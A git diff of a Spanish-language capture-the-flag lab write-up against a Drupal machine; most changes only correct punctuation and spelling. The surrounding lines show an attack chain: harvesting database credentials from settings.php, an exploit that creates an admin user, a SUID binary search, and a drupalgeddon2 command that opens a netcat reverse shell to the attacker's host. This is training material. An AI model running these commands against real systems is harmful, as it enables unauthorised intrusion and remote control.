@@ -18,7 +18,7 @@ El objetivo es encontrar y leer la bandera ubicada en el directorio `root`. Aunq
 ### Detalles adicionales
 - **Número de banderas:** 5
 - Estas banderas contienen pistas útiles para principiantes.
-- Opcional: los usuarios avanzados pueden omitir las banderas intermedias e ir directamente por `root`.
+- Opcional: los usuarios avanzados pueden omitir las banderas intermedias e ir directamente por la de `root`.
 
 ## Configuración del Entorno
 Descargaremos la máquina y la importaremos en VirtualBox. Utilizaremos una máquina Kali Linux para interactuar con el laboratorio. En VirtualBox, debemos crear previamente una red NAT: 
@@ -57,7 +57,7 @@ Para descubrir la dirección IP de la máquina del laboratorio, utilizaremos `ne
    
    ![imagen 4](https://github.com/user-attachments/assets/0aca0772-6c4f-47ca-9788-d970e2cf5e96)
 
-4. Comprobamos que la máquina es accesible con `ping`:
+4. Comprobar que la máquina es accesible con `ping`:
    ```
    ping 10.0.2.5
    ```
@@ -124,7 +124,7 @@ cat /var/www/html/sites/default/settings.php
 Encontramos la segunda bandera `flag2.txt` junto con credenciales de acceso a la base de datos.
 
 ## Flag 2
-**"Los ataques de fuerza bruta y de diccionario no son las únicas formas de obtener acceso (y lo necesitarás). Qué puedes hacer con estas credenciales?"**
+**"Los ataques de fuerza bruta y de diccionario no son las únicas formas de obtener acceso (y lo necesitarás). ¿Qué puedes hacer con estas credenciales?"**
 
 
 Para obtener un bash del sistema, usamos el comando `shell` de `meterpreter` y, tras abrir un canal, ejecutamos:
@@ -146,7 +146,7 @@ select name, pass from users;
 
 ![imagen 17](https://github.com/user-attachments/assets/f6b5f408-f74c-472a-89d8-ae73828a361a)
 
-Podemos descifrar el hash con `hashcat` o `John the Ripper`, pero al realizar una búsqueda con `searchsploit`, encontramos un exploit que nos permite crear un usuario administrador. En lugar de recuperar la contraseña del usuario `admin`, utilizaremos este exploit para generar un nuevo usuario con privilegios administrativos y acceder al `CMS`.
+Podemos descifrar el hash con `hashcat` o `John the Ripper`, pero, al realizar una búsqueda con `searchsploit`, encontramos un exploit que nos permite crear un usuario administrador. En lugar de recuperar la contraseña del usuario `admin`, utilizaremos este exploit para generar un nuevo usuario con privilegios administrativos y acceder al `CMS`.
 
 ![imagen 18](https://github.com/user-attachments/assets/1ab9d5ba-9577-4a08-a0fb-a108e2f2f014)
 
@@ -173,7 +173,7 @@ Identificamos un usuario `flag4` en `/home/flag4`, donde encontramos `flag4.txt`
 
 
 ## Flag 4
-**"Puedes usar este mismo método para encontrar o acceder a la bandera en root? Probablemente. Pero tal vez no sea tan fácil. ¡O quizás sí lo sea!"**
+**"¿Puedes usar este mismo método para encontrar o acceder a la bandera en root? Probablemente. Pero tal vez no sea tan fácil. ¡O quizás sí lo sea!"**
 
 ---
 
@@ -183,7 +183,7 @@ Buscamos binarios con permisos `SUID`:
 find / -perm -u=s 2>/dev/null
 ```
 
-`perm -u=s`: Filtra los archivos que tienen el bit SUID habilitado para el propietario del archivo, `-u=s` especifica que el bit SUID está establecido.
+`perm -u=s`: filtra los archivos que tienen el bit SUID habilitado para el propietario del archivo.
 
 ![imagen 25](https://github.com/user-attachments/assets/d01fb148-c3ab-4fea-b476-d919d85bd297)
 
@@ -209,7 +209,7 @@ python2 drupalgeddon2.py -h http://10.0.2.5 -c 'nohup nc -e /bin/bash 10.0.2.15 
 ```
 
 ### Descripción:
-- `python2 drupalgeddon2.py`: Exploita una vulnerabilidad en Drupal para ejecutar comandos remotos.
+- `python2 drupalgeddon2.py`: Explota una vulnerabilidad en Drupal para ejecutar comandos remotos..
 - `-h http://10.0.2.5`: Especifica la URL del objetivo.
 - `-c 'nohup nc -e /bin/bash 10.0.2.15 9000 &'`: Establece una conexión inversa con `netcat`.
 - `nohup`: Permite que el proceso continúe ejecutándose en segundo plano.
